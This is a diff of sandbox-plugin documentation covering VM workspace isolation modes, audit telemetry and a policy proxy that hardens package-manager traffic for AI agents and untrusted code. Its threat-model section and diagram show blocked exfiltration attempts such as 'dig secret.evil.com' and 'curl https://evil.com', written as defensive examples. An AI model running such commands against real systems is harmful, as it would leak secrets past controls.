 - **Asset Management**: Requires pre-built kernel and rootfs images
 - **No GPU Passthrough**: GPU workloads not supported
 - **Disk Space**: Rootfs images consume disk space (~2GB for Ubuntu)
-- **Network Allowlist Limited**: Fine-grained network allowlists require a custom kernel with netfilter support; basic NAT networking works out of the box
+- **Network Allowlist**: Works with Alpine rootfs (has nftables); uses guest-side filtering
 - **Ubuntu No Workspace**: Ubuntu kernel lacks virtiofs; use Alpine kernel for workspace mounting. See [Workspace Mounting Status](#workspace-mounting-status)
 
 ## Workspace Mounting Status
@@ -1526,6 +2135,258 @@ The Alpine rootfs created by `build-alpine-rootfs.sh` is configured with:
 - Without public DNS, `go build` fails with DNS resolution errors (vmnet DHCP provides a gateway IP that doesn't answer DNS)
 - The 8GB size allows building projects with 100+ dependencies without running out of space
 
+## Workspace Isolation Modes
+
+> [!TIP]
+> **Use `--preserve-workspace` for AI agent and untrusted code workflows.** When running code you don't fully trust (AI-generated code, third-party build scripts), combine isolation modes with `--preserve-workspace` to review changes before they're applied to your actual workspace. This gives you a human-in-the-loop checkpoint for supply chain attacks that modify `package.json`, `go.mod`, or inject malicious files.
+
+The VZ plugin supports multiple workspace isolation modes that control how the host workspace is shared with the VM. These modes provide different trade-offs between safety and convenience.
+
+### Available Modes
+
+| Mode | Description | Use Case |
+|------|-------------|----------|
+| `direct` | Workspace mounted read-write via virtiofs | Default, changes write directly to host |
+| `overlay` | Workspace mounted read-only, changes stored in VM | Safe experimentation, review before commit |
+| `snapshot` | Full copy of workspace in VM | Complete isolation, slower startup |
+| `tmpfs` | Workspace read-only, changes in RAM | Ephemeral changes, discarded on shutdown |
+| `git-worktree` | Creates a git worktree for isolated branch | Git-aware isolation, preserves git history |
+
+### Isolation Mode Architecture
+
+```mermaid
+flowchart TB
+    subgraph Host["macOS Host"]
+        direction TB
+        Workspace["Your Project<br/><code>/Users/you/myapp/</code>"]
+        ChangesDir["Changes Directory<br/><code>/tmp/deputy-vz-workspace/changes-xxx/</code>"]
+    end
+
+    subgraph VZ["Virtualization.framework"]
+        direction TB
+        WBase["virtiofs: workspace-base<br/><i>read-only</i>"]
+        WChanges["virtiofs: workspace-changes<br/><i>write, for sync</i>"]
+    end
+
+    subgraph VM["Alpine Linux VM"]
+        direction TB
+        MntBase["/mnt/workspace-base<br/><i>original files (RO)</i>"]
+        UpperLayer["/mnt/overlay-upper<br/><i>changes (RW, local ext4)</i>"]
+        WorkDir["/mnt/overlay-work<br/><i>overlayfs workdir</i>"]
+        Overlay["overlayfs mount"]
+        WSMount["/workspace<br/><i>merged view</i>"]
+
+        MntBase --> Overlay
+        UpperLayer --> Overlay
+        WorkDir --> Overlay
+        Overlay --> WSMount
+    end
+
+    Workspace -->|"read-only share"| WBase
+    ChangesDir -->|"write share"| WChanges
+    WBase --> MntBase
+    WChanges -->|"sync changes<br/>after execution"| UpperLayer
+
+    style Workspace fill:#e3f2fd,stroke:#1565c0
+    style ChangesDir fill:#c8e6c9,stroke:#2e7d32
+    style WSMount fill:#fff3e0,stroke:#e65100
+```
+
+### Direct Mode (Default)
+
+Direct mode mounts the workspace read-write via virtiofs. Changes made in the VM are immediately visible on the host.
+
+```bash
+# Direct mode - changes write to host immediately
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --network host \
+    --mode full-access \
+    -- go build -o /workspace/myapp .
+```
+
+**Characteristics:**
+- Fastest: no copy overhead
+- Changes visible immediately on host
+- Risk: malicious code can modify your files
+
+### Overlay Mode (Safe Experimentation)
+
+Overlay mode mounts the workspace read-only and stores all changes in the VM's local filesystem. The original workspace is protected.
+
+```bash
+# Overlay mode - workspace protected, changes stored in VM
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --workspace-isolation overlay \
+    --network host \
+    -- npm install untrusted-package
+```
+
+**Characteristics:**
+- Original workspace is read-only (protected)
+- Changes stored on VM's local ext4 rootfs
+- By default, changes are discarded when VM shuts down
+- Use `--preserve-workspace` to keep changes for review
+
+### Review Before Commit Workflow
+
+The `--preserve-workspace` flag (or `review_before_commit` in the API) enables a powerful workflow for reviewing changes before they affect your host filesystem.
+
+```mermaid
+sequenceDiagram
+    participant User
+    participant Deputy
+    participant VM
+    participant Host
+
+    User->>Deputy: exec --workspace-isolation overlay<br/>--preserve-workspace -- npm install
+
+    Deputy->>VM: Create VM with overlay mode
+    Note over VM: workspace-base: read-only virtiofs<br/>workspace-changes: write virtiofs
+
+    VM->>VM: Execute npm install<br/>Changes go to /mnt/overlay-upper
+
+    VM->>VM: Sync changes to /mnt/workspace-changes
+    VM-->>Deputy: Report changes via protocol markers
+
+    Deputy->>Host: Changes saved to<br/>/tmp/deputy-vz-workspace/changes-xxx/
+
+    Deputy-->>User: Show change summary:<br/>• package.json (modified)<br/>• package-lock.json (modified)<br/>• node_modules/ (added)
+
+    User->>Deputy: Review and apply (or discard)
+    Deputy->>Host: Copy approved changes to workspace
+```
+
+**Usage:**
+
+```bash
+# Run command with change review
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --workspace-isolation overlay \
+    --preserve-workspace \
+    --network host \
+    -- npm install new-package
+
+# Output shows changes:
+# Changes detected:
+#   M package.json
+#   M package-lock.json
+#   A node_modules/new-package/...
+#
+# Changes preserved at: /tmp/deputy-vz-workspace/changes-xxx/
+# Review and apply with: deputy workspace apply <path>
+```
+
+**Protocol Markers for Changes:**
+
+The VM reports changes via stdout protocol markers:
+
+| Marker | Description |
+|--------|-------------|
+| `<<<DEPUTY_CHANGES_START>>>` | Beginning of changes list |
+| `<<<DEPUTY_CHANGE:A:path>>>` | File added |
+| `<<<DEPUTY_CHANGE:M:path>>>` | File modified |
+| `<<<DEPUTY_CHANGE:D:path>>>` | File deleted |
+| `<<<DEPUTY_CHANGES_END>>>` | End of changes list |
+
+### Overlay Implementation Details
+
+The overlay mode uses Linux overlayfs inside the VM:
+
+1. **workspace-base** (virtiofs, read-only): Your original workspace shared from host
+2. **Upper layer** (local ext4): Changes stored on VM's rootfs at `/mnt/overlay-upper`
+3. **Work directory** (local ext4): Overlayfs internal at `/mnt/overlay-work`
+4. **Merged view** (`/workspace`): Combined read-write view
+
+**Why local ext4 for upper layer?**
+
+macOS's virtiofs implementation has issues with overlayfs workdir operations (EACCES errors). Using local ext4 storage for the upper and work directories avoids these issues while still providing the same security benefits.
+
+### Snapshot Mode
+
+Snapshot mode creates a full copy of the workspace before execution:
+
+```bash
+# Snapshot mode - full isolation
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --workspace-isolation snapshot \
+    --network host \
+    -- ./untrusted-build.sh
+```
+
+**Characteristics:**
+- Complete isolation: original workspace never touched
+- Slower startup: requires copying all files
+- Changes can be reviewed before applying
+
+### Tmpfs Mode
+
+Tmpfs mode stores changes in RAM, which are automatically discarded:
+
+```bash
+# Tmpfs mode - ephemeral changes (discarded on shutdown)
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --workspace-isolation tmpfs \
+    --network host \
+    -- npm install --dry-run
+```
+
+**Characteristics:**
+- Fastest isolation mode (changes in RAM)
+- Changes automatically discarded
+- Limited by available memory
+
+### Git Worktree Mode
+
+For git repositories, `git-worktree` mode creates an isolated worktree branch for execution:
+
+```bash
+# Run tests in an isolated git worktree
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --workspace-isolation git-worktree \
+    --network host \
+    -- go test ./...
+
+# Review changes before committing (preserves worktree)
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --workspace-isolation git-worktree \
+    --preserve-workspace \
+    --network host \
+    -- go mod tidy
+```
+
+**How it works:**
+1. Creates a new git worktree with a temporary branch
+2. Mounts the worktree directory into the VM
+3. Also mounts the original `.git` directory for full git access
+4. Changes are made to the worktree, not the original directory
+5. On cleanup, the worktree and branch are removed (unless `--preserve-workspace`)
+
+**Characteristics:**
+- Git-aware isolation preserves commit history and branches
+- Changes can be reviewed as a git diff
+- Supports `--preserve-workspace` for human review
+- Full git operations work inside the VM
+- Requires the workspace to be a git repository
+- Secure cleanup: Uses Go 1.24+ `os.Root` for safe directory removal, preventing symlink-based path traversal attacks from a potentially compromised worktree
+
+### Choosing the Right Mode
+
+| Scenario | Recommended Mode | Why |
+|----------|------------------|-----|
+| Building your own code | `direct` | Trust yourself, want changes |
+| Installing untrusted packages | `overlay` + `--preserve-workspace` | Review changes before commit |
+| Running untrusted scripts | `snapshot` | Full isolation |
+| Testing/dry-run | `tmpfs` | Don't want any changes |
+| AI agent workflows | `overlay` + `--preserve-workspace` | Human review of AI changes |
+| Git repository changes | `git-worktree` | Git-aware isolation, easy diff review |
+
 ### Workarounds for Ubuntu (No Workspace)
 
 If using Ubuntu kernel without virtiofs, these alternatives provide host file access:
@@ -1562,6 +2423,102 @@ CONFIG_FUSE_FS=y      # Required by virtiofs
 ```
 
 See [Custom Kernel](#custom-kernel) section above for build instructions.
+
+## Known Issues
+
+The following issues are known and being tracked for future improvement:
+
+### Read-Only Mode
+
+**Status**: Fixed (requires rebuilt initrd)
+
+The `--mode read-only` option mounts both the rootfs and workspace as read-only, providing maximum isolation.
+
+> [!IMPORTANT]
+> Read-only mode requires an initrd built after this fix. If you're seeing hangs with `--mode read-only`, rebuild the Alpine rootfs:
+> ```bash
+> cd examples/sandbox-plugins/vz && ./build-alpine-rootfs.sh
+> ```
+
+```bash
+# Read-only execution: no changes can be made to rootfs or workspace
+deputy exec --runtime plugin --plugin vz --workspace . --mode read-only -- cat README.md
+
+# Note: Commands that write files will fail in read-only mode
+deputy exec --runtime plugin --plugin vz --workspace . --mode read-only -- touch test.txt
+# Error: Read-only file system
+```
+
+Use read-only mode for:
+- Inspecting code without modification risk
+- Running analysis tools that only read files
+- Security-sensitive operations where isolation is paramount
+
+**Technical Details**: When `--mode read-only` is set, the initrd mounts the ext4 rootfs with `-o ro,noload`. The `noload` option is necessary because ext4's journal may need recovery, which requires write access. Skipping journal replay is safe in read-only mode since no writes will occur.
+
+### Complex Shell Commands with Pipes Need Wrapping
+
+**Status**: Expected shell behavior (not a bug)
+
+When you run `deputy exec ... -- cmd1 | cmd2`, the **host shell** interprets the pipe before Deputy sees it. Only `cmd1` gets sent to the VM, while `cmd2` runs on the host and receives the VM's output.
+
+This is actually useful for post-processing VM output on the host, but if you want pipes to run **inside** the VM, you need to wrap the command.
+
+**Solutions**:
+
+```bash
+# This runs "cat" in VM, then "grep" on HOST (often what you want):
+deputy exec --runtime plugin --plugin vz -- cat /etc/os-release | grep PRETTY_NAME
+
+# To run the ENTIRE pipeline inside the VM, wrap with sh -c:
+deputy exec --runtime plugin --plugin vz -- sh -c "cat /etc/os-release | grep PRETTY_NAME"
+
+# Or use a single command that doesn't need pipes:
+deputy exec --runtime plugin --plugin vz -- grep PRETTY_NAME /etc/os-release
+
+# For complex scripts, use a heredoc or script file:
+deputy exec --runtime plugin --plugin vz -- sh -c 'for f in *.go; do wc -l "$f"; done'
+```
+
+**Why this happens**: The `--` separator tells the argument parser to stop processing flags, but shell operators (`|`, `>`, `&&`, etc.) are interpreted by your shell before Deputy even runs.
+
+### Go Toolchain Auto-Downloads Newer Versions
+
+**Status**: Fixed in latest rootfs builds
+
+The pre-installed Go toolchain may attempt to download a newer version if `go.mod` specifies a newer Go version. This can fail without network access or if the download exceeds tmpfs space.
+
+**Solution**: Rootfs images built with the latest `build-alpine-rootfs.sh` automatically set `GOTOOLCHAIN=local`, which prevents auto-downloads and uses the pre-installed Go 1.23.5 toolchain.
+
+**If using an older rootfs**, you can manually set the environment variable:
+
+```bash
+# Option 1: Enable network (allows toolchain download)
+deputy exec --runtime plugin --plugin vz --network host -- go build ./...
+
+# Option 2: Force local toolchain via --env flag
+deputy exec --runtime plugin --plugin vz --env GOTOOLCHAIN=local -- go build ./...
+
+# Option 3: Rebuild your rootfs to include the fix permanently
+cd examples/sandbox-plugins/vz && ./build-alpine-rootfs.sh
+```
+
+### Logging Levels
+
+The VZ plugin respects `DEPUTY_LOG_LEVEL` environment variable:
+
+```bash
+# Default (warn): minimal output, only warnings and errors
+deputy exec --runtime plugin --plugin vz -- echo hello
+
+# Info level: shows phase progress for two-phase execution, workspace syncing
+DEPUTY_LOG_LEVEL=info deputy exec --runtime plugin --plugin vz -- go build ./...
+
+# Debug level: verbose output including VM config, kernel cmdline, boot messages
+DEPUTY_LOG_LEVEL=debug deputy exec --runtime plugin --plugin vz -- echo hello
+```
+
+Valid levels: `debug`, `info`, `warn` (default), `error`
 
 ## Troubleshooting
 
@@ -1889,6 +2846,9 @@ Communication happens over a Unix socket passed via `--socket` flag.
 
 ### Command Execution Protocol
 
+> [!NOTE]
+> **Protocol markers are trust-on-first-use.** The VM communicates results via text markers like `<<<DEPUTY_EXIT_CODE:0>>>` over virtio-console. A malicious guest can forge these markers to report false exit codes or inject fake output. The plugin parses these markers without cryptographic verification. This is acceptable because the hypervisor boundary is the security guarantee—we don't trust the guest, we contain it.
+
 Commands are passed to the VM via kernel command line parameters:
 1. Command and arguments are joined with spaces
 2. The result is base64-encoded
@@ -1955,6 +2915,375 @@ docker run --rm --privileged -v ~/.deputy/vz:/output alpine:3.19 sh -c '
 - Mount errors like "No such device" occur when virtio_blk module isn't loaded
 
 </details>
+
+## Observability
+
+The VZ plugin integrates with Deputy's OpenTelemetry infrastructure for **host-side observability**. This design principle keeps the guest minimal and defensible while providing full visibility into sandbox operations.
+
+### Design Philosophy
+
+**Guest-side:** Minimal footprint (~360 lines of shell script)
+- No daemons or listening services
+- No packet capture or introspection code
+- Ephemeral: destroyed after each execution
+
+**Host-side:** Full OTel integration
+- Metrics: execution duration, exit codes, policy denials
+- Logs: structured audit logging via slog
+- Traces: distributed tracing with W3C TraceContext
+
+### Available Metrics
+
+When `DEPUTY_OTEL_ENABLED=true` and `OTEL_EXPORTER_OTLP_ENDPOINT` is set, Deputy records:
+
+| Metric | Type | Description |
+|--------|------|-------------|
+| `deputy.sandbox.executions` | Counter | Total sandbox executions |
+| `deputy.sandbox.execution.duration` | Histogram | Execution duration (seconds) |
+| `deputy.sandbox.policy_denials` | Counter | Executions blocked by policy |
+| `deputy.sandbox.files_changed` | Counter | Files added/modified/deleted (when available) |
+
+**Attributes:**
+- `deputy.sandbox.runtime`: Runtime type (e.g., `RUNTIME_PLUGIN`)
+- `deputy.sandbox.plugin`: Plugin name (e.g., `vz`)
+- `deputy.sandbox.network_mode`: Network mode (e.g., `NETWORK_MODE_ALLOWLIST`)
+- `deputy.sandbox.workspace_isolation`: Isolation mode (e.g., `WORKSPACE_ISOLATION_OVERLAY`)
+- `deputy.sandbox.exit_code`: Command exit code
+- `status`: `success` or `error`
+
+### Enabling Telemetry
+
+```bash
+# Enable OTel with OTLP exporter
+export DEPUTY_OTEL_ENABLED=true
+export OTEL_EXPORTER_OTLP_ENDPOINT=localhost:4317
+
+# Run sandbox command
+deputy exec --runtime plugin --plugin vz --network host -- go build ./...
+
+# Metrics will be exported to your OTLP collector
+```
+
+### Audit Logging
+
+Structured audit logs are emitted via slog for every sandbox execution:
+
+```json
+{
+  "level": "INFO",
+  "msg": "sandbox_audit",
+  "event_type": "execution_completed",
+  "execution_id": "sandbox-abc123",
+  "runtime": "RUNTIME_PLUGIN",
+  "command": "go",
+  "exit_code": 0,
+  "duration_ms": 1523
+}
+```
+
+Enable JSON logs for production:
+```bash
+DEPUTY_LOG_FORMAT=json deputy exec --runtime plugin --plugin vz -- ...
+```
+
+### What's NOT Captured (By Design)
+
+To maintain guest security, these are **not** implemented:
+- Packet capture inside the VM
+- DNS query logging in guest
+- System call tracing
+- File access auditing
+
+For network-level observability, use the Deputy policy proxy on the host instead of guest-side inspection (see below).
+
+## Policy Proxy Integration
+
+The VZ plugin can optionally route package manager traffic through Deputy's policy proxy for **host-side policy enforcement**. This provides vulnerability scanning, license checks, and security policies without adding complexity to the guest VM.
+
+### How It Works
+
+```mermaid
+sequenceDiagram
+    participant VM as Alpine Linux VM
+    participant Host as Host (macOS)
+    participant Proxy as Deputy Proxy
+    participant Registry as proxy.golang.org
+
+    Note over VM: GOPROXY=http://host:port,direct
+
+    VM->>Host: go get github.com/pkg@v1.0.0
+    Host->>Proxy: Forward to Deputy proxy
+    Proxy->>Proxy: Evaluate CEL policies<br/>(vulnerabilities, licenses, etc.)
+
+    alt Policy Allows
+        Proxy->>Registry: Fetch module
+        Registry-->>Proxy: Module data
+        Proxy-->>Host: Allow download
+        Host-->>VM: Module data
+    else Policy Denies
+        Proxy-->>Host: 403 Forbidden<br/>X-Deputy-Reason: CVE-2024-...
+        Host-->>VM: Download blocked
+    end
+```
+
+### Setup
+
+1. **Start the Deputy proxy** (in a separate terminal):
+
+```bash
+# Create a proxy configuration
+cat > proxy.yaml << 'EOF'
+listeners:
+  - name: go-proxy
+    bind: ":8080"
+    ecosystems: ["go"]
+    upstream: https://proxy.golang.org
+    policies: ["policy/security.yaml"]
+EOF
+
+# Start the proxy
+deputy proxy serve --config proxy.yaml
+```
+
+2. **Set the proxy environment variable**:
+
+```bash
+# Tell VZ plugin to route traffic through the proxy
+export DEPUTY_VZ_PROXY=http://host.local:8080
+```
+
+3. **Run commands in the VM**:
+
+```bash
+# Go commands will be routed through Deputy proxy
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --network host \
+    -- go get github.com/example/pkg@latest
+```
+
+### Environment Variables
+
+| Variable | Description | Example |
+|----------|-------------|---------|
+| `DEPUTY_VZ_PROXY` | Deputy proxy URL for package manager traffic | `http://192.168.64.1:8080` |
+| `DEPUTY_VZ_STRICT_PROXY` | Enable strict mode: no `,direct` fallback, DNS blocked after boot | `true` |
+
+### Supported Package Managers
+
+The init script configures environment variables for common package managers:
+
+| Package Manager | Environment Variable | Standard Mode | Strict Mode |
+|-----------------|---------------------|---------------|-------------|
+| Go | `GOPROXY` | `proxy,direct` (fallback allowed) | `proxy` only (no fallback) |
+| Go | `GONOSUMDB` | (not set) | `*` (proxy handles checksums) |
+| npm/yarn | `NPM_CONFIG_REGISTRY`, `YARN_REGISTRY` | Registry URL | Registry URL |
+| pip | `PIP_INDEX_URL`, `PIP_TRUSTED_HOST` | PyPI simple index | PyPI simple index |
+| curl/wget | `HTTP_PROXY`, `HTTPS_PROXY` | (not set) | Proxy URL (catches HTTP tools) |
+
+### Example: Block Vulnerable Packages
+
+```yaml
+# policy/security.yaml
+policies:
+  - name: block-critical-vulns
+    entrypoints: ["go_artifact_request"]
+    rules:
+      - action: deny
+        when: vulnerabilities.exists(v, v.advisory.severity.level == severity.critical)
+        reason: "Critical vulnerability detected"
+        remediation: "Update to a patched version or use an alternative package"
+```
+
+### Network Considerations
+
+When using the proxy:
+- The proxy must be reachable from the VM (via NAT gateway at `192.168.64.1`)
+- Use `host.local` or the actual host IP, not `localhost`
+- The VM's network mode should be `host` (NAT) or `bridge`
+- For air-gapped environments, pre-populate the proxy cache
+
+### Combining with Network Allowlist
+
+You can combine proxy integration with network allowlisting for defense-in-depth:
+
+```bash
+# Standard mode: proxy + allowlist (DNS still allowed)
+export DEPUTY_VZ_PROXY=http://192.168.64.1:8080
+
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --network allowlist \
+    --network-allow "192.168.64.1:8080" \
+    -- go build ./...
+```
+
+For maximum security, enable strict mode to also block DNS:
+
+```bash
+# Strict mode: proxy + allowlist + DNS blocking
+export DEPUTY_VZ_PROXY=http://192.168.64.1:8080
+export DEPUTY_VZ_STRICT_PROXY=true
+
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --network allowlist \
+    --network-allow "192.168.64.1:8080" \
+    -- go build ./...
+```
+
+This ensures:
+1. All package manager traffic goes through the Deputy proxy
+2. The VM cannot bypass the proxy by connecting directly to registries
+3. Policies are enforced at the host level (not bypassable from guest)
+4. (Strict mode) DNS exfiltration is blocked - no `dig secret.evil.com` attacks
+
+### Security Considerations
+
+**The proxy alone is NOT a security boundary.** A compromised dependency with code execution in the guest can bypass the proxy. The VZ plugin provides multiple security levels to balance usability and security:
+
+#### Security Levels
+
+| Level | Configuration | Protection | Use Case |
+|-------|--------------|------------|----------|
+| **Basic** | `--network host` + `DEPUTY_VZ_PROXY` | Policy enforcement only | Development, trusted code |
+| **Standard** | `--network allowlist` + `DEPUTY_VZ_PROXY` | Policy + egress filtering | CI/CD, moderate isolation |
+| **Strict** | `--network allowlist` + `DEPUTY_VZ_PROXY` + `DEPUTY_VZ_STRICT_PROXY=true` | Policy + egress + DNS blocking | Production, untrusted code |
+| **Maximum** | Strict + `DEPUTY_VZ_USER=nobody` | All above + privilege reduction | AI agents, untrusted code |
+
+#### Attack Vectors by Security Level
+
+| Attack Vector | Basic | Standard | Strict | Maximum |
+|---------------|-------|----------|--------|---------|
+| Unset `GOPROXY` env var | Vulnerable | Blocked | Blocked | Blocked |
+| Direct `curl`/`wget` | Vulnerable | Blocked | Blocked | Blocked |
+| DNS exfiltration | Vulnerable | Vulnerable | **Blocked** | Blocked |
+| Rootfs modification | Vulnerable | Vulnerable | Vulnerable | **Blocked** |
+| Privilege escalation | N/A | N/A | N/A | **Mitigated** |
+| DHCP abuse | Vulnerable | Vulnerable | Vulnerable* | Vulnerable* |
+
+*DHCP is required for VM networking; abuse is theoretically possible but impractical.
+
+#### Strict Proxy Mode
+
+Strict proxy mode (`DEPUTY_VZ_STRICT_PROXY=true`) provides the strongest security:
+
+```mermaid
+flowchart TB
+    subgraph Boot["VM Boot (Strict Mode)"]
+        direction TB
+        B1["Start VM with NAT"]
+        B2["DHCP assigns IP"]
+        B3["DNS temporarily enabled"]
+        B4["Resolve allowlist hostnames"]
+        B5["Block DNS (nftables)"]
+        B6["Configure proxy (no ,direct fallback)"]
+        B1 --> B2 --> B3 --> B4 --> B5 --> B6
+    end
+
+    subgraph Runtime["Runtime (DNS Blocked)"]
+        direction TB
+        R1["go build ./..."]
+        R2["GOPROXY=http://proxy (no fallback)"]
+        R3["nftables: DNS port 53 BLOCKED"]
+        R4["nftables: only proxy IP allowed"]
+        R1 --> R2
+        R2 --> R4
+    end
+
+    Boot --> Runtime
+
+    subgraph Attack["Attack Attempts (Blocked)"]
+        direction TB
+        A1["unset GOPROXY<br/>go get evil.com"]
+        A2["curl https://evil.com"]
+        A3["dig secret.evil.com"]
+        A1 -->|"nftables DROP"| blocked1["Blocked"]
+        A2 -->|"nftables DROP"| blocked2["Blocked"]
+        A3 -->|"DNS blocked"| blocked3["Blocked"]
+    end
+
+    style blocked1 fill:#c8e6c9,stroke:#2e7d32
+    style blocked2 fill:#c8e6c9,stroke:#2e7d32
+    style blocked3 fill:#c8e6c9,stroke:#2e7d32
+```
+
+**Strict mode features:**
+- **No `,direct` fallback**: `GOPROXY` is set to proxy URL only (no direct registry access)
+- **DNS blocked after boot**: Hostnames resolved at boot, then DNS (port 53) is blocked via nftables
+- **HTTP_PROXY set**: Catches tools like `curl`, `wget` that respect HTTP_PROXY
+- **GONOSUMDB=***: Proxy handles checksums (no direct sum.golang.org access)
+
+**Strict mode usage:**
+
+```bash
+# Maximum security: strict proxy + allowlist
+export DEPUTY_VZ_PROXY=http://192.168.64.1:8080
+export DEPUTY_VZ_STRICT_PROXY=true
+
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --network allowlist \
+    --network-allow "192.168.64.1:8080" \
+    -- go build ./...
+```
+
+#### Standard Mode (Recommended for CI/CD)
+
+Standard mode provides good security without breaking legitimate DNS usage:
+
+```bash
+# Balanced security: proxy + allowlist (DNS allowed)
+export DEPUTY_VZ_PROXY=http://192.168.64.1:8080
+
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --network allowlist \
+    --network-allow "192.168.64.1:8080" \
+    -- go build ./...
+```
+
+This blocks direct registry access but allows DNS queries. Sufficient for most CI/CD pipelines where the threat model is "prevent accidental vulnerable dependency installation" rather than "defend against sophisticated attacker with code execution."
+
+#### Maximum Security Mode (Recommended for AI Agents)
+
+Maximum security combines all protections: strict proxy + non-root execution:
+
+```bash
+# Maximum security: strict proxy + allowlist + non-root user
+export DEPUTY_VZ_PROXY=http://192.168.64.1:8080
+export DEPUTY_VZ_STRICT_PROXY=true
+export DEPUTY_VZ_USER=nobody
+
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --network allowlist \
+    --network-allow "192.168.64.1:8080" \
+    -- go build ./...
+```
+
+This is the recommended configuration for:
+- **AI coding agents** (Claude, Codex) where the agent controls command execution
+- **Untrusted code** from unknown sources
+- **Production security-sensitive** workloads
+
+#### Environment Variables
+
+| Variable | Description | Default |
+|----------|-------------|---------|
+| `DEPUTY_VZ_PROXY` | Deputy proxy URL | (none) |
+| `DEPUTY_VZ_STRICT_PROXY` | Enable strict proxy mode (`true`/`false`) | `false` |
+| `DEPUTY_VZ_USER` | Run as unprivileged user (e.g., `nobody`) | (root) |
+
+#### Remaining Attack Surface (Maximum Mode)
+
+Even in maximum mode, some attack surface remains:
+
+- **DHCP (ports 67/68)**: Required for VM networking. Abuse is theoretically possible but impractical.
+- **Pre-boot window**: Brief window during boot before DNS is blocked. Mitigated by boot speed (~1.5s).
+- **User namespace escape**: Unlikely in VZ VMs but theoretically possible kernel bugs.
+
+**Defense-in-depth principle:** The proxy provides *policy enforcement* (block vulnerable packages). The network allowlist provides *isolation* (prevent bypass). Strict mode provides *exfiltration protection* (block DNS tunneling). Non-root execution provides *privilege reduction* (limit damage from code execution). Use all four together for AI agent workloads with untrusted code.
 
 ## References
 
